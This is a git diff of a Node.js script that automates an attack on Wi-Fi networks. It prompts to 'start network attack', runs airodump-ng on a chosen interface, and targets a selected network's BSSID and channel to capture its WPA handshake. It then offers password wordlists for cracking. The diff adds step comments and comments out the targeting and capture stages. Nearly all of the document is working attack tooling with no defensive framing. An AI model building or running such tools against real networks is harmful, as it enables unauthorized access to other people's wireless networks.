@@ -31,6 +31,7 @@ const readFile = () => {
     return fs.readFileSync(path.join(__dirname, 'tmp/networks.json'), { encoding: 'utf8' })
 }
 
+// start network attack, save [{wlan0, wlan1}] in network.json
 new Promise((resolve, reject) => {
     prompt('Start network attack? (y: yes, n: no)? ', input => {
         if (input === 'y') {
@@ -43,42 +44,53 @@ new Promise((resolve, reject) => {
             process.exit()
         }
     })
-}).then(() => {
+})
+// choose wlan1, save 'airodump-ng wlan1 -w tmp/test-01.csv' to file
+.then(() => {
     return new Promise((resolve) => {
         prompt('\r\nChoose the number of your wifi modem interface:\r\n', input => {
             const res = input.replace('.', '')
             const networks = readFile()
             const selected = JSON.parse(networks.toString())[res - 1].interface.replace(':', '')
             console.log('\r\nYou have choosen: ' + selected)
-            setTimeout(exampleCommand.status((err, status) => {
+            exampleCommand.status((err, status) => {
                 console.log(status)
-                resolve()
-            }, 'airodump-ng ' + selected + ' test.txt'), 60000);
-            resolve(selected)
+            }, 'airodump-ng ' + selected + ' -w tmp/test')
+                resolve(selected)
+            exampleCommand.stdin.pause();
         })
     })
-}).then((selected) => {
+})
+
+/*
+// convert content of test.csv to json format, create 'airodump-ng wlan1 --bssid' command
+.then((selected) => {
     return new Promise((resolve) => {
+        airodump.convertWpastream()
         console.log('\r\nAvailable networks for the attack:\r\n')
         airodump.getEssids().map((item, index) => console.log(index + 1 + '. ' + item))
 
         prompt('\r\nChoose the number of your target network:\r\n', input => {
             const res = input.replace('.', '')
             const network = airodump.getSelectedNetwork(airodump.getEssids()[res - 1])
-            const command = 'airodump-ng ' + selected + ' -c ' + network[0].channel + ' --bssid ' + network[0].BSSID + ' -w wpastream'
+            const command = 'airodump-ng ' + selected + ' -c ' + network[0].channel + ' --bssid ' + network[0].BSSID + ' -w tmp/wpastream'
             //const command = 'git status'
             console.log('\r\nExecute command: ' + command + '\r\n')
             resolve(command)
         })
     })
-}).then((command) => {
+})
+// executes 'airodump-ng wlan1 --bssid' command, save to tmp/wpastream.cap
+.then((command) => {
     return new Promise((resolve) => {
         exampleCommand.status((err, status) => {
             console.log(status)
             resolve()
         }, command);
     })
-}).then(() => {
+})
+//choose attack list
+.then(() => {
     console.log('\r\nOperation successful. Available password lists:\r\n\r\n1. 100.000 most common\r\n2. 1000.000 words')
     prompt('\r\nChoose the number of your choice:\r\n', input => {
         const res = input.replace('.', '')
@@ -88,3 +100,4 @@ new Promise((resolve, reject) => {
 })
 
 //airodump-ng wlan0 -c [channel of access point] --bssid [mac of access point] -w wpastream
+*/
